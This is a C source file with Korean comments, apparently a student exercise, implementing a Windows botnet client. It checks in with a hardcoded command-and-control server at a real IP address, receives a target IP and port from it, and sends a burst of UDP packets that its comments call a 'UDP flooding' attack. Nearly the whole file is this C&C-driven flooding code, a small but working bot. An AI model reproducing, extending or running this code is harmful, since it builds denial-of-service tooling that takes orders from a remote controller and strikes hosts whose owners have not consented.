#include <stdio.h>
#include <string.h>
#include <winsock2.h>

#pragma comment (lib, "ws2_32.lib")
#pragma warning(disable : 4996)
int main() {
	SOCKET clientSocket; // 소켓 선언
	WSADATA wsaData; // 윈도우 소켓 선언
	SOCKADDR_IN servAddr; // 소켓 주소 선언
	char buffer[1024] = "IMHACKER_2017111366"; // C&C 서버에 전송하고자 하는 메시지를 buffer 변수에 담기

	char* newData=NULL; // C&C 서버로부터 받은 데이터를 사용할 문자열만 추출하여 담을 변수
	char* ip=NULL; // 공격받을 기기의 ip 주소
	char* port=NULL; // 공격받을 기기의 port 번호
	char newBuffer[1024] = "2017111366"; // 공격받을 기기로 보낼 데이터(udp flooding 할 시 보낼 데이터)

	// 윈도우 소켓 초기화
	if (WSAStartup(WINSOCK_VERSION, &wsaData) != 0) {
		printf("윈도우 소켓 초기화 실패");
		return 0;
	}

	// 클라이언트 소켓 생성
	clientSocket = socket(PF_INET, SOCK_DGRAM, 0);

	// 소켓 생성 여부 확인
	if (clientSocket == INVALID_SOCKET) {
		printf("소켓 생성 실패");
		// 윈도우 소켓 종료 함수
		WSACleanup();
		return 0;
	}

	// 소켓 주소 초기화
	ZeroMemory(&servAddr, sizeof(servAddr));
	// 서버의 주소 체계
	servAddr.sin_family = AF_INET;
	// 전송할 포트번호
	servAddr.sin_port = htons(10004);
	// 전송할 서버 ip 주소
	// inet_addr은 IP주소를 문자열 형태로 넘겨주면 long 형태로 바꿔주는 역할을 함.
	servAddr.sin_addr.S_un.S_addr = inet_addr("114.70.37.17");

	// 서버와의 연결
	if (connect(clientSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
		printf("서버 연결 실패");
		closesocket(clientSocket);
		WSACleanup();
		return 0;
	}

	printf("서버와 연결 되었습니다.\n");

	// c&c 서버로 데이터 전송
	send(clientSocket, buffer, sizeof(buffer), 0);
	printf("데이터 전송 성공 ! \n");

	// c&c 서버로부터 데이터 수신
	recv(clientSocket, buffer, sizeof(buffer), 0); 
	// 서버에서 보낸 데이터 출력
	printf("[서버에서 보낸 데이터]\n%s\n\n", buffer);

	// 1이라는 숫자가 나오는 시점부터 끊어서 데이터 새로 받아오기
	newData = strstr(buffer, "1");
	// 받아온 데이터에서 :를 기점으로 ip와 port번호 분리하기
	ip = strtok(newData, ":");
	// strtok 로 끊으면 마지막 위치에 NULL이 들어가기 때문에
	// 잘린 문자열 다음부터 분리할 때는 NULL을 이용하면 됨.
	port = strtok(NULL, "");
	
	// 서버로부터 받은 IP와 PORT 주소
	printf("IP : %s , PORT : %s\n", ip, port);

	// 기존의 정의되어 있던 서버 주소를 초기화 함
	ZeroMemory(&servAddr, sizeof(servAddr));
	servAddr.sin_family = AF_INET;
	// atoi를 통하여 문자열을 정수화 함
	servAddr.sin_port = htons(atoi(port));
	servAddr.sin_addr.s_addr = inet_addr(ip);

	// 공격받을 기기로 연결을 시도
	if (connect(clientSocket, (SOCKADDR*)&servAddr, sizeof(servAddr)) == SOCKET_ERROR) {
		printf("서버 연결 실패");
		closesocket(clientSocket);
		WSACleanup();
		return 0;
	}

	// 클라이언트에게 udp flooding 공격
	for (int i = 0; i < 10; i++) {
		// 위에서 선언했던 새로운 데이터인 newBuffer를 udp flooding 할 때 사용함.
		send(clientSocket, newBuffer, sizeof(newBuffer), 0);
	}

	// udp flooding이 끝나고 공격 성공이라는 메시지를 띄움
	printf("UDP Flooding 성공!\n");
	
	// 사용한 socket을 닫음
	closesocket(clientSocket);

	// 윈도우 소켓을 종료
	WSACleanup();

	while(1);
}